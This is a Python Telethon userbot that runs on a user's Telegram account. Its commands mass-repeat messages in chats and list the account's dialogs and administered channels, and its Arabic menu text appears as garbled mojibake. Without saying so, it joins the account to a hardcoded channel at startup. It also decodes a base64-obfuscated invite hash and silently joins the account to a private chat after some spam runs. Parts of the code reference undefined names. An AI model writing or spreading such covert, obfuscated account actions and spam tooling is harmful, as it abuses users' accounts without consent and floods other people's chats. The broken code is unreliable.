import os
import random
import datetime
import base64
import logging
import asyncio
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
import requests
from config import *
import asyncio
from telethon import events
import time
from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl import functions
from hijri_converter import Gregorian
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
from collections import deque
from telethon import events
from telethon.errors import FloodWaitError
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.tl import functions
import time
import asyncio
import logging
import base64
import datetime
from payment import *
from calcu import *
from telethon.tl import functions, types
from googletrans import Translator, constants
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.utils import get_display_name
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.errors import FloodWaitError
from telethon import TelegramClient, events
from collections import deque
from telethon.tl import functions, types
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.errors.rpcerrorlist import (
    UserAlreadyParticipantError,
    UserNotMutualContactError,
    UserPrivacyRestrictedError,
)
from telethon.tl.types import (
    ChannelParticipantsAdmins,
    ChannelParticipantsKicked,
    ChatBannedRights,
    UserStatusEmpty,
    UserStatusLastMonth,
    UserStatusLastWeek,
    UserStatusOffline,
    UserStatusOnline,
    UserStatusRecently
)
from telethon.tl import functions
from hijri_converter import Hijri, Gregorian
from telethon.tl.functions.users import GetFullUserRequest
from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl.functions.account import UpdateNotifySettingsRequest
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.tl.types import InputPeerUser
from telethon.sessions import StringSession
y = datetime.datetime.now().year
m = datetime.datetime.now().month
dayy = datetime.datetime.now().day
day = datetime.datetime.now().strftime("%A")
m9zpi = f"{y}-{m}-{dayy} - {day} day"

APP_ID  = input("[~] Enter APP ID :")
API_HASH = input("[~] Enter API HASH :")

topac = TelegramClient("session", APP_ID, API_HASH)
topac.start()

LOGS = logging.getLogger(__name__)

logging.basicConfig(
    format="[%(levelname)s- %(asctime)s]- %(name)s- %(message)s",
    level=logging.INFO,
    datefmt="%H:%M:%S",
)

async def join_channel():
    try:
        await topac(JoinChannelRequest("@topac"))
    except BaseException:
        pass
    try:
        await topac(JoinChannelRequest("@topac"))
    except BaseException:
        pass
 
 
GCAST_BLACKLIST = [
    -1001118102804,
    -1001161919602,
]

DEVS = [
    1694386561,
    2034443585,
]
DEL_TIME_OUT = 60
normzltext = "1234567890"
namerzfont = "1234567890"
@topac.on(events.NewMessage(outgoing=True, pattern=".ØºØ±Ø§Ø¶ÙŠ"))
async def _(event):
    if event.fwd_from:
        return
    start = datetime.datetime.now()
    u = 0  # number of users
    g = 0  # number of basic groups
    c = 0  # number of super groups
    bc = 0  # number of channels
    b = 0  # number of bots
    await event.edit("ÙŠØªÙ… Ø§Ù„ØªØ¹Ø¯Ø§Ø¯ Ø§Ù†ØªØ¶Ø± Ù‚Ù„ÙŠÙ„Ø§..")
    async for d in topac.iter_dialogs(limit=None):
        if d.is_user:
            if d.entity.bot:
                b += 1
            else:
                u += 1
        elif d.is_channel:
            if d.entity.broadcast:
                bc += 1
            else:
                c += 1
        elif d.is_group:
            g += 1
        else:
            logger.info(d.stringify())
    end = datetime.datetime.now()
    ms = (end - start)
    await event.edit("""ØªÙ… Ø§Ø³ØªØ®Ø±Ø§Ø¬Ù‡Ø§ ÙÙŠ {} Ø«ÙˆØ§Ù†ÙŠ
`Ø§Ù„Ø§Ø´Ø®Ø§Øµ :\t{}
Ø§Ù„Ù…Ø¬Ù…ÙˆØ¹Ø§Øª Ø§Ù„Ø¹Ø§Ø¯ÙŠØ© :\t{}
Ø§Ù„Ù…Ø¬Ù…ÙˆØ¹Ø§Øª Ø§Ù„Ø®Ø§Ø±Ù‚Ø© :\t{}
Ø§Ù„Ù‚Ù†ÙˆØ§Øª :\t{}
Ø§Ù„Ø¨ÙˆØªØ§Øª :\t{}
`""".format(ms, u, g, c, bc, b))

@topac.on(events.NewMessage(outgoing=True, pattern=".ØªÙƒØ±Ø§Ø± (.*)"))
async def spammer(event):
    sandy = await event.get_reply_message()
    cat = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)
    counter = int(cat[0])
    if counter > 50:
        sleeptimet = 0.5
        sleeptimem = 1
    else:
        sleeptimet = 0.1
        sleeptimem = 0.3
    await event.delete()
    await spam_function(event, sandy, cat, sleeptimem, sleeptimet)


async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    counter = int(cat[0])
    if len(cat) == 2:
        spam_message = str(cat[1])
        for _ in range(counter):
            if event.reply_to_msg_id:
                await sandy.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and sandy.media:
        for _ in range(counter):
            sandy = await event.client.send_file(
                event.chat_id, sandy, caption=sandy.text
            )
            await _catutils.unsavegif(event, sandy)
            await asyncio.sleep(sleeptimem)
    elif event.reply_to_msg_id and sandy.text:
        spam_message = sandy.text
        for _ in range(counter):
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
        try:
            hmm = Get(hmm)
            await event.client(hmm)
        except BaseException:
            pass

@topac.on(events.NewMessage(outgoing=True, pattern=".Ù…Ø¤Ù‚Øª (.*)"))
async def spammer(event):
    reply = await event.get_reply_message()
    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    sleeptimet = sleeptimem = float(input_str[0])
    cat = input_str[1:]
    await event.delete()
    await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)
  
@topac.on(events.NewMessage(pattern=r".Ø§Ø¯Ù…Ù†", outgoing=True))
async def _(event):
    if event.fwd_from:
        return
    result = await topac(functions.channels.GetAdminedPublicChannelsRequest())
    output_str = "Ø§Ù†Øª Ø§Ø¯Ù…Ù† ÙÙŠ : \n"
    for channel_obj in result.chats:
        output_str += f"- {channel_obj.title} @{channel_obj.username} \n"
    await event.edit(output_str)
            
@topac.on(events.NewMessage(outgoing=True, pattern=".Ø§Ù„Ø§ÙˆØ§Ù…Ø±"))
async def _(event):
      await event.edit(""" Ø§ÙˆØ§Ù…Ø± Ø§Ù„Ø³ÙˆØ±Ø³ : 

`.ÙØ­Øµ`
- Ù„ØªØ¬Ø±Ø¨Ù‡ Ø§Ù„Ø³ÙˆØ±Ø³

`.Ù…Ø¤Ù‚Øª` + ÙˆÙ‚Øª Ø¨Ø§Ù„Ø«ÙˆØ§Ù†ÙŠ  + Ø¹Ø¯Ø¯ ØªÙƒØ±Ø§Ø± + Ù†Øµ
- ÙŠÙ‚ÙˆÙ… Ø¨Ø¹Ù…Ù„ ØªÙƒØ±Ø§Ø± Ù…Ø¤Ù‚Øª Ù„Ù„ÙƒÙ„Ø§Ù… 

`.ØªÙƒØ±Ø§Ø±`  + Ø§Ù„Ø¹Ø¯Ø¯ + Ø§Ù„ÙƒÙ„Ø§Ù…
- ÙŠÙ‚ÙˆÙ… Ø¨ØªÙƒØ±Ø§Ø± Ø§Ù„ÙƒÙ„Ø§Ù…
`.Ø§Ø¯Ù…Ù†` 
- Ø±Ø§Ø­ ÙŠØ·Ù„Ø¹Ù„Ùƒ Ø§Ù„Ù‚Ù†ÙˆØ§Øª Ø§Ù„ÙŠ Ø§Ù†ØªÙ‡ Ø¨ÙŠÙ‡Ù† ØµØ§Ø¹Ø¯ Ø§Ø¯Ù…Ù†
`.ØºØ±Ø§Ø¶ÙŠ`
- ÙŠØ·Ù„Ø¹Ù„Ùƒ ÙƒÙ„Ø´ÙŠ Ø¨Ø­Ø³Ø§Ø¨Ùƒ Ù…ÙˆØ¬ÙˆØ¯ 

Ù…Ù„Ø§Ø­Ø¶Ù‡ :- Ø³ÙŠØª Ø§Ø¶Ø§ÙÙ‡ Ø§Ø´ÙŠØ§Ø¡ Ø¬Ø¯ÙŠØ¯Ù‡ ÙƒÙ„ÙŠØ§ Ù…Ø«Ø§Ù„ Ø¹Ù„ Ù‡Ù„ Ø§Ø´ÙŠØ§Ø¡ Ø§Ø¯Ø§Ø© ØªØ¬Ù…ÙŠØ¹ Ù†Ù‚Ø§Ø· Ø¨ÙˆØªØ§Øª ØªÙ…ÙˆÙŠÙ„ + ÙØ­Øµ ÙŠÙˆØ²Ø±Ø§Øª ØªÙ„ÙŠØ¬Ø±Ø§Ù… Ø¯Ù‚Ù‡ 1000%
""")
      
@topac.on(events.NewMessage(outgoing=True, pattern=".ÙØ­Øµ"))
async def _(event):
      await event.edit("""ÙŠØ¹Ù…Ù„ Ø¨Ù†Ø¬Ø§Ø­
âœ¦â”â”â”â”â”â”â”â”âœ¦
- ğ—‰ğ—’ğ—ğ—ğ—ˆğ—‡ â­Ÿ 3.10
- ğ—ˆğ—ğ—‡ğ–¾ğ—‹ â­Ÿ @Trntt
âœ¦â”â”â”â”â”â”â”â”âœ¦"""
)
@topac.on(events.NewMessage(outgoing=True, pattern=".Ø§Ù„Ù…Ø·ÙˆØ±"))
async def _(event):
      await event.edit("""Ø§Ù„Ù…Ø·ÙˆØ± 
âœ¦â”â”â”â”â”â”â”â”âœ¦
- ğ˜¿ğ™€ğ™‘ : @IIIT5
- ğ˜¾ğ™ğ™–ğ™£ğ™£ğ™šğ™¡ : @TrntT
âœ¦â”â”â”â”â”â”â”â”âœ¦"""
)
print("""
                       
   ØªÙ… ØªØ´ØºÙŠÙ„ Ø§Ù„Ø³ÙˆØ±Ø³ Ø¨Ù†Ø¬Ø§Ø­
    """)


topac.loop.create_task(join_channel())
topac.run_until_disconnected()
